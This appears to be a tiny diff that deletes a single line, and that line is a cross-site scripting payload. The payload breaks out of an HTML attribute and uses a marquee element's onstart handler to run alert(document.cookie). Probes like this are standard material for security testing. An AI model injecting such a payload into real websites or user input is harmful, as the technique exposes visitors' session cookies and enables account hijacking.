@@ -1,1 +1,0 @@
-"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
